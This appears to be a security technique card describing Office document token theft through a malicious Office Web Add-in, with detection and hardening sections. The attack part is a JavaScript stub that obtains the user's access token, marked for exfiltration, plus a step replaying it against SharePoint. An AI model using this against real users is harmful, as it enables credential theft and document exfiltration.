# [CA-TOKEN-010]: Office Document Token Theft

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-010 |
| **MITRE ATT&CK v18.1** | [Steal or Forge Authentication Certificates (T1528)](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access |
| **Platforms** | M365 / Windows |
| **Severity** | **Medium** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Office Applications (Word, Excel) cache tokens to access SharePoint/OneDrive. Attackers can inject a malicious Add-in or macro that leverages the user's existing authenticated session to access Graph API or SharePoint data without re-authentication.
- **Attack Surface:** Office Add-in Web Context.
- **Business Impact:** **Document Exfiltration**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Ability to run Macros / Add-ins.
- **Tools:**
    - Custom Office Add-in

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Get Token (JavaScript API)**
In a malicious Office Web Add-in:
```javascript
Office.context.auth.getAccessTokenAsync(function (result) {
    if (result.status === "succeeded") {
        var token = result.value;
        // Exfiltrate token
    }
});
```

**Step 2: Replay**
Use the token to download files from SharePoint.

## 5. DETECTION (Blue Team Operations)

#### 5.1 Entra ID Logs
| Source | Event | Filter Logic |
|---|---|---|
| **SignInLogs** | `Office Add-in` | Anomalous usage of Office Add-ins or tokens issued to unknown add-ins. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Admin Consent:** Restrict the installation of Office Add-ins to a curated catalog. Block users from sideloading add-ins.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-PHISH-005]
> **Next Logical Step:** [EXFIL-M365-001]
